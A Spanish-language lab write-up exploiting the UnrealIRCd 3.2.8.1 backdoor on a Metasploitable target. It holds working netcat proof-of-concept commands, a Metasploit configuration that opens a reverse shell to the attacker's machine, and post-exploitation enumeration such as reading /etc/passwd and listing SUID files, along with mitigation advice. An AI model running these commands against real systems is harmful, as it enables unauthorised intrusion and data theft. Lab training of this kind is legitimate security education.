# 💥 Explotación de UnrealIRCd 3.2.8.1 — Backdoor Remoto

## 🧠 Objetivo del laboratorio

En este laboratorio explotaremos un **backdoor remoto** presente en *UnrealIRCd 3.2.8.1*, detectado en versiones que fueron comprometidas en su repositorio oficial.  
Este backdoor permite a un atacante ejecutar comandos arbitrarios en el sistema remoto con los privilegios del usuario que ejecuta el servicio.

---

## 📚 ¿Qué es UnrealIRCd?

UnrealIRCd es un servidor IRC (Internet Relay Chat) muy popular y ampliamente utilizado.  
En 2010, el repositorio oficial fue comprometido y la versión **3.2.8.1** descargada durante ese periodo contenía un **troyano** que introducía un backdoor:  
- Cualquier cliente que enviara una cadena especial (`AB;<comando>`) podía ejecutar comandos arbitrarios en el servidor, sin autenticación.

---

## ⚠️ Riesgo de la vulnerabilidad

- **Impacto:** Ejecución Remota de Comandos (RCE)
- **Confidencialidad:** Comprometida — el atacante puede leer ficheros.
- **Integridad:** Comprometida — el atacante puede modificar y eliminar datos.
- **Disponibilidad:** Comprometida — el atacante puede detener servicios o el sistema.

---

## 🎯 Objetivos del ejercicio

1. Detectar el servicio UnrealIRCd y confirmar versión vulnerable.
2. Probar la ejecución remota de comandos de forma manual.
3. Explotar con Metasploit para obtener una shell reversa.
4. Realizar post-explotación básica y documentar hallazgos.
5. Proponer medidas de mitigación.

---

## 🔍 Paso 1 — Escaneo con Nmap

Ejecutamos un escaneo específico al puerto 6667 para identificar el servicio:

```bash
nmap -sV -p 6667 192.168.56.102
````

| Puerto | Protocolo | Servicio     | Descripción                                                                 |
|--------|-----------|--------------|------------------------------------------------------------------------------|
| 6667   | TCP       | UnrealIRCd   | Puerto estándar para comunicación IRC sin cifrado. Usado por clientes IRC.  |
| 6697   | TCP       | UnrealIRCd   | Puerto alternativo para IRC cifrado con SSL/TLS (no siempre activo).        |

✅ Confirmamos que el servicio está activo y en versión vulnerable.

## 🧪 Paso 2 — Prueba manual de la vulnerabilidad

PoC manual con hadshake IRC:

```bash
( printf "NICK pwn\r\n";
  printf "USER pwn 0 * :pwn\r\n";
  sleep 1;
  printf "AB;id\r\n";
  sleep 1;
) | nc 192.168.56.102 6667
```

PoC directo:

```bash
printf "AB;uname -a\r\n" | nc 192.168.56.102 6667
```

Nota:
En algunos casos el backdoor ejecuta pero no devuelve salida al cliente, por lo que puede ser difícil confirmar manualmente. Por ello, utilizaremos también Metasploit.

## 🚀 Paso 3 — Explotación con Metasploit

Abrimos msfconsole:

```bash
msfconsole
```

Seleccionamos el módulo específico:

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.102
set RPORT 6667
set LHOST 192.168.56.101   # IP de nuestro Kali
set LPORT 4446
set PAYLOAD cmd/unix/reverse
run
```

Salida esperada:

[*] Started reverse TCP handler on 192.168.56.101:4446 
[*] 192.168.56.102:6667 - Connected to target, sending payload...
[*] Command shell session 1 opened (192.168.56.101:4446 -> 192.168.56.102:45123) at 2025-08-08 12:45:01 +0200


## 🖥️ Paso 4 — Post-explotación inicial

Una vez dentro del sistema:

```bash
whoami
id
uname -a
hostname
pwd
```

Salida esperada:

```bash
daemon
uid=1(daemon) gid=1(daemon) groups=1(daemon)
Linux metasploitable 2.6.24-16-server #1 SMP i686 GNU/Linux
metasploitable
/home/daemon
```

## 🔍 Paso 5 — Enumeración básica

Información del sistema:

```bash
cat /etc/issue
cat /etc/os-release 2>/dev/null
```

Usuarios:

```bash
cat /etc/passwd | head -n 20
```

Procesos:

```bash
ps aux | head -n 15
```

Puertos abiertos:

```bash
netstat -tulpen 2>/dev/null
```

Archivos SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

## 📂 Evidencias guardadas

- Capturas de nmap.
- Salida del PoC manual.
- Pantallazos de Metasploit con shell.
- Resultados de whoami, id, uname -a.
- Lista de SUIDs.

## 💥 Impacto

- **Confidencialidad:** acceso a datos internos.
- **Integridad:** modificación/eliminación de ficheros.
- **Disponibilidad:** posibilidad de denegar servicios.
- Potencial de **escalada de privilegios** a root.

## 🛡️ Medidas de mitigación

1. **Actualizar** UnreallRCd a una versión segura desde repositorios oficiales.
2. **Verificar checksums** y firmas digitales antes de instalar.
3. **Registringir acceso** al puerto 6667 mediante firewall.
4. **Monitorizar logs** para detectar conexiones y comandos sospechosos.
5. **Segmentar redes** para que servicios como IRC no sean accesibles desde Internet.

## 📌 Notas finales

- Esta vulnerabilidad es un ejemplo claro de supply chain attack: el software oficial fue comprometido en el origen.
- El pentester debe siempre confirmar la versión y aplicar explotación controlada únicamente en entornos autorizados.
- En producción, este fallo podría permitir tomar control total del sistema.
